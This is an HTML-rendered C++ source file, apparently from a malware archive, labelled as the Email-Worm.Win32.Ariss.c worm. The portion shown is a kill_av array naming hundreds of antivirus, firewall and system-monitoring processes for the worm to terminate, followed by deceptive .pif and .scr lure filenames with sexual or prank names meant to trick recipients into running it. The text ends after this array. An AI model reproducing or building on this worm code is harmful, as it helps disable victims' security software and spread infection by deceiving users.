<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Ariss.c - Assiral.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc12 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">#include &lt;windows.h&gt;
#include &lt;tlhelp32&gt;
#include &lt;fstream&gt;
#include &lt;mapi&gt;
#include &lt;memory&gt;
</span><span class="sc0">
</span><span class="sc9">#pragma argsused
</span><span class="sc0">
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">kill_av</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc6">"AGENTSVR.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ANTI-TROJAN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ANTIVIRUS.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ANTS.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"APIMONITOR.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"APLICA32.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"APVXDWIN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ATCON.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"ATGUARD.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ATRO55EN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ATUPDATER.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ATWATCH.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"AUPDATE.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AUTODOWN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AUTOTRACE.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AUTOUPDATE.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"AVCONSOL.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AVGSERV9.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AVLTMAIN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AVPUPD.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"AVSYNMGR.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AVWUPD32.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AVXQUAR.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AVprotect9x.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"Au.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"BD_PROFESSIONAL.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"BIDEF.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"BIDSERVER.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"BIPCP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"BIPCPEVALSETUP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"BISP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"BLACKD.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"BLACKICE.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"BOOTWARN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"BORG2.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"BS120.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"CCAPP.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CDP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CFGWIZ.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CFIADMIN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CFIAUDIT.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"CFINET.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CFINET32.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CLEAN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CLEANER.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CLEANER3.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"CLEANPC.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CMGRDIAN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CMON016.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CPD.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CPF9X206.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"CPFNT206.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CV.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CWNB181.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CWNTDWMO.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"D3dupdate.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"DEFWATCH.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"DEPUTY.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"DPF.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"DPFSETUP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"DRWATSON.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"DRWEBUPW.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ENT.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ESCANH95.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ESCANHNT.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"ESCANV95.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"EXANTIVIRUS-CNET.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"FAST.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"FIREWALL.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"FLOWPROTECTOR.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"FP-WIN_TRIAL.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"FRW.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"FSAV.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"FSAV530STBYB.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"FSAV530WTBYB.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"FSAV95.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"GBMENU.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"GBPOLL.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"GUARD.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"HACKTRACERSETUP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"HTLOG.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"HWPE.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"IAMAPP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"IAMSERV.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ICLOAD95.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"ICLOADNT.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ICMON.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ICSSUPPNT.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ICSUPP95.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"ICSUPPNT.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"IFW2000.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"IPARMOR.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"IRIS.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"JAMMER.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"KAVLITE40ENG.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"KAVPERS40ENG.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"KERIO-PF-213-EN-WIN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"KERIO-WRL-421-EN-WIN.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"KERIO-WRP-421-EN-WIN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"KILLPROCESSSETUP161.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"LDPRO.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LOCALNET.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LOCKDOWN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LOCKDOWN2000.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"LSETUP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LUALL.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LUCOMSERVER.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LUINIT.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"MCAGENT.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MCUPDATE.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MFW2EN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MFWENG3.02D30.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"MGUI.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"msconfig.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MINILOG.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MOOLIVE.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MRFLUX.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"MSCONFIG.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MSINFO32.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MSSMMC32.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MU0311AD.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"NAV80TRY.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NAVAPW32.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NAVDX.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NAVSTUB.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"NAVW32.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NC2000.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NCINST4.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NDD32.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"NEOMONITOR.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NETARMOR.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NETINFO.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NETMON.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"NETSCANPRO.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NETSPYHUNTER-1.2.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NETSTAT.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"NISSERV.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NISUM.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NMAIN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NORTON_INTERNET_SECU_3.0_407.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"NPF40_TW_98_NT_ME_2K.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NPFMESSENGER.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NPROTECT.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"NSCHED32.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NTVDM.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NUPGRADE.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NVARCH16.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"NWINST4.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NWTOOL16.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"OSTRONET.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"OUTPOST.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"OUTPOSTINSTALL.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"OUTPOSTPROINSTALL.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PADMIN.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"PANIXK.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PAVPROXY.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PCC2002S902.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PCC2K_76_1436.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"PCCIOMON.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PCDSETUP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PCFWALLICON.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PCIP10117_0.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"PDSETUP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PERISCOPE.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PERSFW.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PF2.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PFWADMIN.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"PINGSCAN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PLATIN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"POPROXY.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"POPSCAN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PORTDETECTIVE.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"PPINUPDT.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PPTBC.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PPVSTOP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PROCEXPLORERV1.0.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"PROPORT.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PROTECTX.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PSPF.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PURGE.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PVIEW95.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"QCONSOLE.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"QSERVER.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"RAV8WIN32ENG.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"RESCUE.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"RESCUE32.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"RRGUARD.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"RSHELL.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"RTVSCN95.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"RULAUNCH.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SAFEWEB.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SBSERV.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SD.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SETUPVAMEEVAL.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"SETUP_FLOWPROTECTOR_US.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SFC.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SGSSFW32.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"avserve2.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SHELLSPYINSTALL.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SHN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SMC.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"SOFI.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SPF.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SPHINX.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SPYXX.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SS3EDIT.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"ST2.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SUPFTRL.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SUPPORTER5.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SYMPROXYSVC.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"SYSEDIT.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TASKMGR"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TASKMON.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TAUMON.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TAUSCAN.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"TC.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TCA.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TCM.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TDS-3.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TDS2-98.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"TDS2-NT.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TFAK5.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TGBOB.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TITANIN.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"TITANINXP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TRACERT.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TRJSCAN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TRJSETUP.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"TROJANTRAP3.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"UNDOBOOT.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"UPDATE.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VBCMSERV.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"VBCONS.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VBUST.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VBWIN9X.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VBWINNTW.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"VCSETUP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VFSETUP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VIRUSMDPERSONALFIREWALL.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"VNLAN300.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VNPC3000.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VPC42.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VPFW30S.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"VPTRAY.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VSCENU6.02D30.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VSECOMR.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VSHWIN32.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"VSISETUP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VSMAIN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VSMON.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VSSTAT.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"VSWIN9XE.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VSWINNTSE.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VSWINPERSE.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"W32DSM89.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"W9X.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WATCHDOG.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WEBSCANX.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"WGFE95.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WHOSWATCHINGME.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WINRECON.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"WNT.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WRADMIN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WRCTRL.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WSBGATE.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"WYVERNWORKSFIREWALL.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"XPF202EN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ZAPRO.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"ZAPSETUP3001.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ZATUTOR.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ZAUINST.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ZONALM2601.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"ZONEALARM.EXE"</span><span class="sc10">,</span><span class="sc6">"zlclient.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lexplore.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Drunk_lol.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Webcam_004.pif"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"sexy_bedroom.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"naked_party.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"love_me.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"osm.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cz.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"LOL.scr"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Webcam.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"hahahaha.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"me_2005.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sister.pif"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"winhost.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LOL.scr"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Webcam.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"bedroom-thongs.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"naked_drunk.pif"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"LMAO.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ROFL.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"underware.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Hot.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"new_webcam.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"msnus.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"sexy.jpg"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"updates.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"msnmsr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"bedroom-things.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"naked_drunk.pif"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"my_pussy.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ROFL.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Hot.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"new_webcam.pif"</span><span class="sc10">,</span><span class="sc6">"ISASS.EXE"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"Beautiful Ass.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"John Kerry as Super Chicken.scr"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Kool.pif"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"Me &amp; you pic!.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Me Pissed!.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sexy.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"She Could Fit her Ass in a Teacup.pif"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"she's fuckin fit.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"titanic2.jpg.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"winis.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nvsc32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">};</span><span class="sc0">

